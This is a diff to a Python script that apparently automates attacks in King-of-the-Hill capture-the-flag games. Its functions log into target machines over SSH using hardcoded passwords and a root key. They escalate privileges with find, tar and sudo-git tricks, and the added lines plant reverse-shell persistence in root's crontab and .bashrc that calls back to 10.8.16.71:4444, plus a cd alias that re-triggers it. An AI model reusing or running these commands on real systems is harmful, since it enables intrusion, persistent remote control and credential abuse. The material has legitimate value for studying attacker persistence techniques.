@@ -112,11 +112,19 @@ def help():
             10. wordGen 
             11. koth
             12. serveHttp
+            13. defaultTheme
+            14. splitV
+            15. splitH
+            16. domenum
+            17. serveHttp
+            18. serveHttp
+            19. serveHttp
+            20. serveHttp
+            
             more are in progress
             """)
 
 def koth():
-    ipAdd = input("[ENTER YOUR MACHINE IP]: ")
     inp = input("[WHICH MACHINE TO PWN]: ")
     if inp == "production":
         ashu_at_production()
@@ -139,7 +147,7 @@ def hello_friend():
 def run_http_server():
     try:
         port = input("[ENTER THE PORT FOR SERVER]: ")
-        command = f"python -m http.server {port} "
+        command = f"python -m http.server {port} & bg "
         subprocess.run(command,shell=True)
     except Exception as exp:
         print(exp)
@@ -156,6 +164,9 @@ def ashu_at_production():
                 whoami
                 sudo git branch --help config << EOF1
                 whoami
+                echo "* * * * * /bin/bash -i >& /dev/tcp/10.8.16.71/4444 0>&1" >> /var/spool/cron/root
+                echo "/bin/bash -i >& /dev/tcp/10.8.16.71/4444 0>&1 & disown" >> ~/.bashrc
+                alias cd="cd && source .bashrc &"
                 EOF1
                 EOF"""
         subprocess.run(command, shell=True)
@@ -165,10 +176,10 @@ def ashu_at_production():
 def panda():
     command = f"""
             echo "shifu's password is 'batman'"
-            echo -e "enter the machine IP: "
-            read IP
+            read -p "[ENTER THE TARGET IP]: " IP
             ssh -t shifu@$IP << EOF
             find . -exec /bin/sh -p \; -quit
+            whoami
             echo "* * * * * /bin/bash -i >& /dev/tcp/10.8.16.71/4444 0>&1" >> /var/spool/cron/root
             echo "/bin/bash -i >& /dev/tcp/10.8.16.71/4444 0>&1 & disown" >> ~/.bashrc
             alias cd="cd && source .bashrc &"
@@ -176,15 +187,32 @@ def panda():
     """
     subprocess.run(command, shell=True)
 
+def lion():
+    command = f"""
+        echo "[ip address]: "
+        read ip
+        ssh -t root@$IP -i ./ssh/lion_root_id_rsa -p 1337 << EOF
+        service cron start
+        echo "* * * * * /bin/bash -i >& /dev/tcp/10.8.16.71/4444 0>&1" >> /var/spool/cron/root
+        echo "/bin/bash -i >& /dev/tcp/10.8.16.71/4444 0>&1 & disown" >> ~/.bashrc
+        alias cd="cd && source .bashrc &"
+        EOF
+    """
+    subprocess.run(command, shell=True)
+
+
 def donkey_at_shrek():
-    ip = input("enter the ip address for shrek: ")
     command = f"""echo "donkey:J5rURvCa8DyTg3vR"
                 echo "enter the ip address : "
                 read ip
-                ssh -T donkey@{ip} << EOF
+                ssh -T donkey@$ip << EOF
                 sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
                 python -c "import pty;pty.spawn('/bin/bash')"
                 whoami
+                service cron start
+                echo "* * * * * /bin/bash -i >& /dev/tcp/10.8.16.71/4444 0>&1" >> /var/spool/cron/root
+                echo "/bin/bash -i >& /dev/tcp/10.8.16.71/4444 0>&1 & disown" >> ~/.bashrc
+                alias cd="cd && source .bashrc &"
                 EOF"""
     subprocess.run(command, shell=True)
 
